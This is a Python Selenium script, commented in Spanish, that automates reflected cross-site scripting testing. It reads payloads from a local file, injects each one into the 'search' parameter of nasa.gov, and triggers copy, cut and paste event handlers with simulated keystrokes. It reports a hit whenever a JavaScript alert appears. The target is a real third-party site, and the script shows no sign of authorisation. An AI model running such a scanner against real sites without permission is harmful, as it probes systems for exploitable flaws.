from selenium import webdriver
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys  # Importar Keys
from selenium.common.exceptions import NoSuchElementException
import time

# Configuración inicial del navegador
options = Options()
options.add_argument("--disable-popup-blocking")  # Asegura que se muestren los diálogos
service = Service("/usr/bin/chromedriver")  # Reemplaza con la ruta correcta

driver = webdriver.Chrome(service=service, options=options)

# Parámetros del script
url = "https://nasa.gov/"
param = "search"  # Parámetro objetivo
payloads_file = "/home/raulc0nes/Descargas/notas.txt"
min_delay = 2  # Tiempo mínimo de espera entre payloads (segundos)

# Cargar payloads desde un archivo local
with open(payloads_file, "r") as file:
    payloads = file.readlines()

# Variables de control
is_paused = False
auto_mode = True  # Controla si el script avanza automáticamente

def get_user_command():
    """Función para recibir un comando del usuario."""
    print("[COMANDO] Presiona 's' para pausar, 'c' para continuar, 'n' para el siguiente payload, 'a' para modo automático.")
    while True:
        command = input("> ").strip().lower()
        if command in ['s', 'c', 'n', 'a']:
            return command
        else:
            print("[ERROR] Comando inválido. Usa 's', 'c', 'n' o 'a'.")

def wait_for_page_load(driver, timeout=10):
    """Espera a que la página termine de cargar completamente."""
    elapsed = 0
    while elapsed < timeout:
        # Verificar el estado de la página con JavaScript
        state = driver.execute_script("return document.readyState")
        if state == "complete":
            print("[INFO] La página se ha cargado completamente.")
            break
        time.sleep(0.5)
        elapsed += 0.5
    if elapsed >= timeout:
        print("[WARNING] Tiempo máximo de carga alcanzado. Continuando...")

def click_target_text(driver):
    """Busca y hace clic en un elemento con el texto específico."""
    try:
        target_element = driver.find_element("xpath", "//*[text()='D41D8CD98F00B204E9800998ECF8427E']")
        target_element.click()
        print("[INFO] Elemento con texto 'D41D8CD98F00B204E9800998ECF8427E' encontrado y clicado.")
    except NoSuchElementException:
        print("[WARNING] Elemento con texto 'D41D8CD98F00B204E9800998ECF8427E' no encontrado.")

def send_key_combination(payload):
    """Envía una combinación de teclas basada en el contenido del payload."""
    actions = ActionChains(driver)
    if "oncut=" in payload:
        print("[INFO] Payload contiene 'oncut='. Enviando Ctrl + X.")
        actions.key_down(Keys.CONTROL).send_keys("x").key_up(Keys.CONTROL).perform()
    elif "oncopy=" in payload:
        print("[INFO] Payload contiene 'oncopy='. Enviando Ctrl + C.")
        actions.key_down(Keys.CONTROL).send_keys("c").key_up(Keys.CONTROL).perform()
    elif "onpaste=" in payload:
        print("[INFO] Payload contiene 'onpaste='. Enviando Ctrl + V.")
        actions.key_down(Keys.CONTROL).send_keys("v").key_up(Keys.CONTROL).perform()

# Iterar sobre los payloads
for payload in payloads:
    payload = payload.strip()
    test_url = f"{url}?{param}={payload}"
    print(f"[INFO] Probando payload: {payload}")
    driver.get(test_url)

    # Esperar a que la página cargue completamente
    wait_for_page_load(driver)

    # Intentar hacer clic en el texto antes de enviar combinaciones de teclas
    click_target_text(driver)

    # Detectar y enviar combinaciones de teclas
    send_key_combination(payload)

    # Esperar el tiempo mínimo definido
    time.sleep(min_delay)

    try:
        # Detectar si aparece un diálogo JavaScript
        alert = Alert(driver)
        dialog_text = alert.text

        if dialog_text:
            print(f"[!] XSS detectado con payload: {payload}")
            print(f"    Tipo de diálogo detectado: {dialog_text}")
        alert.dismiss()  # Cierra el diálogo
    except:
        pass  # Si no hay diálogo, continúa con el siguiente payload

    # Controlar pausa, avance manual y modo automático
    while True:
        if auto_mode and not is_paused:
            print("[MODO AUTOMÁTICO] Continuando con el siguiente payload...")
            break

        command = get_user_command()
        if command == "s":
            print("[PAUSA] Análisis pausado. Presiona 'c' para continuar.")
            is_paused = True
        elif command == "c" and is_paused:
            print("[CONTINUAR] Reanudando el análisis.")
            is_paused = False
        elif command == "n":
            print("[SIGUIENTE] Avanzando al siguiente payload.")
            break
        elif command == "a":
            auto_mode = not auto_mode
            mode = "automático" if auto_mode else "manual"
            print(f"[MODO] Cambiado a modo {mode}.")
            if auto_mode:
                break

# Cierra el navegador
driver.quit()

